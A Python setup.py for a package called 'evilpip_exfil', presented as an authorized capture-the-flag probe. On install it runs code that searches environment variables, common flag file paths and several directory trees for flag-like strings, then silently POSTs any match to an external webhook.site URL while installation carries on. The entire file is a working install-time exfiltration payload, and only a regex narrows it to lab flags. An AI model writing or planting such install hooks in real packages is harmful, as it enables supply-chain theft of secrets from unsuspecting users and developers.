# Authorized CTF-only package probe. Send ONLY a lab flag if found.
import os
import re
import json
from pathlib import Path
from urllib.request import Request, urlopen
from setuptools import setup

WEBHOOK = 'https://webhook.site/1d8060ad-8009-455f-b74c-a4ff2ac3bcec'
FLAG = re.compile(rb'(?:ALGOLYMP|CTF|FLAG)\{[^}\r\n]{2,200}\}', re.I)

locations = [
    '/flag', '/flag.txt', '/app/flag', '/app/flag.txt',
    '/home/ctf/flag', '/home/ctf/flag.txt', '/root/flag', '/root/flag.txt',
    '/challenge/flag', '/challenge/flag.txt', '/srv/flag', '/srv/flag.txt',
    '/run/secrets/flag', '/tmp/flag', '/tmp/flag.txt', '/workspace/flag.txt',
    '/opt/flag', '/opt/flag.txt', '/var/flag.txt', '/secrets/flag',
]

def extract_flag(data):
    match = FLAG.search(data)
    return match.group(0).decode('utf-8', 'replace') if match else None

def find_flag():
    for value in os.environ.values():
        found = extract_flag(value.encode('utf8', 'replace'))
        if found: return found
    for loc in locations:
        try:
            p = Path(loc)
            if p.is_file() and p.stat().st_size <= 65536:
                found = extract_flag(p.read_bytes())
                if found: return found
        except OSError:
            pass
    for root in ('/app','/home/ctf','/challenge','/srv','/workspace','/tmp'):
        try:
            for directory, subdirs, files in os.walk(root):
                if directory[len(root):].count(os.sep) > 3:
                    subdirs[:] = []
                    continue
                subdirs[:] = [d for d in subdirs if d not in ('site-packages','.git','node_modules','__pycache__')]
                for file in files:
                    if file.lower().startswith('flag'):
                        try:
                            p=Path(directory)/file
                            if p.is_file() and p.stat().st_size <= 65536:
                                found=extract_flag(p.read_bytes())
                                if found: return found
                        except OSError:
                            pass
        except OSError:
            pass
    return None

flag = find_flag()
if flag:
    try:
        data=json.dumps({'ctf_flag':flag},ensure_ascii=True).encode('utf-8')
        req=Request(WEBHOOK,data=data,headers={'Content-Type':'application/json'},method='POST')
        with urlopen(req,timeout=4) as response:
            response.read(64)
    except Exception:
        # Do not expose unrelated data; installation still proceeds.
        pass

setup(name='evilpip_exfil', version='0.4.0', packages=['evilpip_exfil'], description='Authorized CTF flag-only probe')
